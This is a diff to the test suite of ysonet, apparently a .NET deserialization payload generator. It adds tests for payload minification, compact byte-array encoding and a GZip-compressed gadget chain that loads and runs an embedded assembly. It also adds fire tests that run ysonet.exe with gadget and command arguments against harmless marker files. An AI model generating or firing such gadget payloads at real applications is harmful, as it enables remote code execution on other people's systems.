@@ -118,6 +118,11 @@ namespace ysonet.Tests
             Run("XmlMinifier scales linearly on a big inline-assembly payload", XmlMinifierScalesOnBigPayload);
             Run("XmlMinifier dirty-match pass scales on a big hex attribute", XmlMinifierDirtyMatchScalesOnHexAttribute);
             Run("XmlMinifier dirty-match pass output is unchanged by the guard+lookbehind fix", XmlMinifierDirtyMatchOutputUnchanged);
+            Run("XmlMinifier trims the leading space of a generic type's outer assembly", XmlMinifierTrimsLeadingSpaceInGenericTypeName);
+            Run("XmlMinifier removes a namespace orphaned by a discardable regex (guarded)", XmlMinifierRemovesNamespaceOrphanedByDiscard);
+            Run("Byte-array encoder emits the compact bare <Byte> tag", ByteArrayEncoderEmitsBareTag);
+            Run("GetterSettingsPropertyValue Xaml uses the compact byte array", GspvXamlUsesCompactByteArray);
+            Run("DataSetOldBehaviourFromFile --compressed shrinks via a GZip payload chain", DataSetFromFileCompressedIsSmaller);
             Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
             Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);
 
@@ -2464,6 +2469,160 @@ namespace ysonet.Tests
                 "pure-hex attribute minify unchanged (guard path)");
         }
 
+        // Locks the leading-space trim added to XmlDirtyMatchReplaceMinifier's space-removal
+        // delegate. The outer assembly of a generic type is emitted with a space after the
+        // closing brackets, e.g. "]], System.Data.Services". The run match starts right after
+        // those brackets, so the three original passes (each needs a captured char on the space's
+        // left) cannot reach it; only the new leading-space trim removes it. The other
+        // assembly-name shapes stay byte-identical (see XmlMinifierDirtyMatchOutputUnchanged).
+        private static void XmlMinifierTrimsLeadingSpaceInGenericTypeName()
+        {
+            string input = "<root type=\"A`2[[X, PF, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"/>";
+            string result = XmlMinifier.Minify(input, null, null);
+            AssertTrue(result.IndexOf("]],System.Data.Services,", StringComparison.Ordinal) >= 0,
+                "leading space after the generic ']]' is trimmed: " + result);
+            AssertTrue(result.IndexOf("]], System", StringComparison.Ordinal) < 0,
+                "no space survives after the generic brackets: " + result);
+            AssertTrue(XmlWellFormednessError(result) == null,
+                "trimmed output stays well-formed XML: " + result);
+        }
+
+        // Locks the namespace cleanup XmlDirtyMatchReplaceMinifier runs after the discardable
+        // regexes. A discard can delete the only use of a namespace, and the XSLT unused-namespace
+        // pass has already run by then, so the minifier re-runs it to drop the now-orphaned
+        // declaration. Also verifies the guard: a discard that leaves non-well-formed XML (a
+        // stripped closing tag, as ResourceSet does deliberately) must not throw and must keep
+        // the discarded text.
+        private static void XmlMinifierRemovesNamespaceOrphanedByDiscard()
+        {
+            string input = "<root xmlns:p=\"http://keep.example/ns\" xmlns:q=\"http://drop.example/ns\"><p:Keep>x</p:Keep><q:Drop Marker=\"y\"/></root>";
+
+            // (a) Discard the only element that uses the 'q' namespace; its xmlns must be dropped
+            // while the still-used 'p' namespace stays, and the result must remain well-formed.
+            string orphaned = XmlMinifier.Minify(input, null, new string[] { "<[a-zA-Z]:Drop[^>]*/>" });
+            AssertTrue(orphaned.IndexOf("http://keep.example/ns", StringComparison.Ordinal) >= 0,
+                "still-used namespace is kept: " + orphaned);
+            AssertTrue(orphaned.IndexOf("http://drop.example/ns", StringComparison.Ordinal) < 0,
+                "orphaned namespace is removed after the discard: " + orphaned);
+            AssertTrue(XmlWellFormednessError(orphaned) == null,
+                "orphan-cleaned output is well-formed XML: " + orphaned);
+
+            // (b) A discard that removes a closing tag leaves malformed XML on purpose; the
+            // re-parse is guarded, so Minify must not throw and must keep the discarded result.
+            string malformed = null;
+            bool threw = false;
+            try { malformed = XmlMinifier.Minify(input, null, new string[] { "</root>" }); }
+            catch { threw = true; }
+            AssertTrue(!threw, "a discard that breaks well-formedness must not throw");
+            AssertTrue(malformed != null && malformed.IndexOf("</root>", StringComparison.Ordinal) < 0,
+                "the closing-tag discard was applied: " + malformed);
+            AssertTrue(malformed != null && malformed.IndexOf("Keep", StringComparison.Ordinal) >= 0,
+                "surviving content is kept after the guarded re-parse: " + malformed);
+        }
+
+        // Locks the DataSetOldBehaviourFromFile --compressed option (GZip-in-payload). The
+        // compressed payload must be smaller than the plain inline-byte-array form AND carry the
+        // GZipStream decompress chain that reconstitutes the assembly at deserialization time.
+        // End-to-end execution of the compressed payload is covered by PayloadsFireIntoTestSinks.
+        private static void DataSetFromFileCompressedIsSmaller()
+        {
+            string cs = Path.Combine(Path.GetTempPath(), "ysonet_dsff_compress_fixture.cs");
+            File.WriteAllText(cs, "public class YsonetCompressFixture { public YsonetCompressFixture() { } }");
+            try
+            {
+                byte[] plain = GenerateDsffFromFile(cs, false);
+                byte[] compressed = GenerateDsffFromFile(cs, true);
+                AssertTrue(plain != null && plain.Length > 0, "uncompressed DataSetFromFile generates");
+                AssertTrue(compressed != null && compressed.Length > 0, "compressed DataSetFromFile generates");
+                AssertTrue(compressed.Length < plain.Length,
+                    "compressed payload is smaller (" + compressed.Length + " vs " + plain.Length + " bytes)");
+                AssertTrue(BytesContainAscii(compressed, "GZipStream"),
+                    "compressed payload carries the GZipStream decompress chain");
+                AssertTrue(!BytesContainAscii(plain, "GZipStream"),
+                    "the plain payload does not use GZipStream");
+            }
+            finally { try { File.Delete(cs); } catch { } }
+        }
+
+        // Generate a DataSetOldBehaviourFromFile BinaryFormatter payload from a .cs file,
+        // optionally with --compressed. Returns the raw bytes (null on failure).
+        private static byte[] GenerateDsffFromFile(string csPath, bool compressed)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = csPath;
+            ia.Minify = true;
+            if (compressed) ia.ExtraArguments = new List<string> { "--compressed" };
+            GenerationRequest req = new GenerationRequest
+            {
+                GadgetName = "DataSetOldBehaviourFromFile",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = ia,
+            };
+            RunResult r = PayloadRunner.GenerateGadget(req);
+            return r.Success ? (r.Raw as byte[]) : null;
+        }
+
+        // True if the ASCII bytes of `needle` appear anywhere in `hay` (the XAML inside a BF blob
+        // is stored as ASCII, so its element names are byte-searchable without decoding the blob).
+        private static bool BytesContainAscii(byte[] hay, string needle)
+        {
+            if (hay == null) return false;
+            byte[] n = Encoding.ASCII.GetBytes(needle);
+            for (int i = 0; i + n.Length <= hay.Length; i++)
+            {
+                bool ok = true;
+                for (int j = 0; j < n.Length; j++) { if (hay[i + j] != n[j]) { ok = false; break; } }
+                if (ok) return true;
+            }
+            return false;
+        }
+
+        // Locks the compact byte-array encoding. An inline byte array in XAML/XmlSerializer used
+        // to spend "<s:Byte>N</s:Byte>" (19 chars) per byte; declaring the System namespace as
+        // the default on the array lets each element be the bare "<Byte>N</Byte>" (15 chars),
+        // saving 4 bytes per array element. On payloads that embed a whole assembly that is
+        // several KB. XmlByteArrayEncoder is the shared helper; here we lock the tag it emits.
+        private static void ByteArrayEncoderEmitsBareTag()
+        {
+            byte[] b = new byte[] { 1, 2, 255 };
+            string bare = XmlByteArrayEncoder.ConvertBytesToArrayOfUnsignedByteXML(b, "Byte", "", "");
+            AssertEqual("<Byte>1</Byte><Byte>2</Byte><Byte>255</Byte>", bare, "encoder emits the compact bare <Byte> tag");
+            // The prefixed form must still be available for callers that need it.
+            string prefixed = XmlByteArrayEncoder.ConvertBytesToArrayOfUnsignedByteXML(b, "s:Byte", "", "");
+            AssertEqual("<s:Byte>1</s:Byte><s:Byte>2</s:Byte><s:Byte>255</s:Byte>", prefixed, "encoder still supports a prefixed tag");
+        }
+
+        // Locks the compact byte array in the GetterSettingsPropertyValue Xaml payload (the
+        // tool's largest payload): bare <Byte> children under an <assembly:Array> that declares
+        // the System namespace as its default, instead of an "s:" prefix on every byte. The
+        // command is only a string here; generation never executes it. The end-to-end firing is
+        // covered by the FULL PayloadsFireIntoTestSinks matrix.
+        private static void GspvXamlUsesCompactByteArray()
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe"; // command string only; generation does not run it
+            ia.Minify = true;
+            GenerationRequest req = new GenerationRequest
+            {
+                GadgetName = "GetterSettingsPropertyValue",
+                FormatterName = "Xaml",
+                OutputFormat = "",
+                InputArgs = ia,
+            };
+            RunResult r = PayloadRunner.GenerateGadget(req);
+            AssertTrue(r.Success, "gspv Xaml generates: " + r.ErrorMessage);
+            string xaml = r.Raw as string;
+            AssertTrue(!string.IsNullOrEmpty(xaml), "gspv Xaml is a non-empty string");
+            AssertTrue(xaml.IndexOf("<Byte>", StringComparison.Ordinal) >= 0,
+                "gspv uses the bare <Byte> element (compact form)");
+            AssertTrue(xaml.IndexOf("<s:Byte>", StringComparison.Ordinal) < 0,
+                "gspv no longer uses the wasteful <s:Byte> prefix on every byte");
+            AssertTrue(xaml.IndexOf("Type=\"s:Byte\" xmlns=\"clr-namespace:System;assembly=mscorlib\"", StringComparison.Ordinal) >= 0,
+                "the byte array declares the System namespace as its default so bare <Byte> resolves");
+            AssertTrue(XmlWellFormednessError(xaml) == null, "gspv Xaml stays well-formed XML");
+        }
+
         // Every gadget must actually produce a non-empty payload from valid inputs,
         // not merely declare that it supports a formatter. Data-driven, so a newly
         // added gadget is covered automatically. For each gadget it picks a sample
@@ -3483,7 +3642,14 @@ namespace ysonet.Tests
         // minified payload must still execute.
         private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace, bool minify)
         {
-            string label = gadget + (minify ? " (minify)" : "");
+            FireSelfClosingCs(gadget, failures, ref fired, ref skipped, trace, minify, false);
+        }
+
+        // The 7-arg overload also fires the --compressed path (GZip-in-payload). It must still
+        // Assembly.Load and run the compiled type after decompressing, just like the plain form.
+        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace, bool minify, bool compressed)
+        {
+            string label = gadget + (minify ? " (minify)" : "") + (compressed ? " (compressed)" : "");
             string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
             if (!File.Exists(exe))
             {
@@ -3494,14 +3660,14 @@ namespace ysonet.Tests
 
             // Distinct marker/cs per minify state so a red test is unambiguous and the two
             // fires for one gadget never share files.
-            string marker = MarkerPath(gadget + (minify ? "_min" : "") + "_selfcs");
-            string cs = Path.Combine(Path.GetTempPath(), "ysonet_selfcs_" + (minify ? "min_" : "") + gadget + ".cs");
+            string marker = MarkerPath(gadget + (minify ? "_min" : "") + (compressed ? "_c" : "") + "_selfcs");
+            string cs = Path.Combine(Path.GetTempPath(), "ysonet_selfcs_" + (minify ? "min_" : "") + (compressed ? "c_" : "") + gadget + ".cs");
             SafeDelete(marker);
             File.WriteAllText(cs, "public class E { public E() { System.IO.File.WriteAllText(@\"" + marker + "\", \"x\"); } }");
             if (trace) { Console.Error.WriteLine("    [fire] " + label + " (self-cs subprocess)"); Console.Error.Flush(); }
             try
             {
-                string extra = minify ? " --minify" : "";
+                string extra = (minify ? " --minify" : "") + (compressed ? " --compressed" : "");
                 var psi = new System.Diagnostics.ProcessStartInfo(exe,
                     "-g " + gadget + " -f BinaryFormatter -c \"" + cs + "\" -t" + extra);
                 psi.UseShellExecute = false;
@@ -3660,6 +3826,11 @@ namespace ysonet.Tests
             FireSelfClosingCs("ActivitySurrogateSelectorFromFile", failures, ref fired, ref skipped, trace, true);
             FireSelfClosingCs("XamlAssemblyLoadFromFile", failures, ref fired, ref skipped, trace, true);
             FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, true);
+            // DataSetOldBehaviourFromFile --compressed (GZip the embedded assembly): the payload
+            // must decompress it via a GZipStream and still Assembly.Load + run the type. Cover
+            // both compressed and compressed+minify (the minified form is what a user ships).
+            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, false, true);
+            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, true, true);
 
             // ---- Plugin MARKER via each plugin's own -t self-test path. ----
             FirePluginMarker("Altserialization", new[] { "-M", "HttpStaticObjectsCollection" }, failures, ref fired, trace);
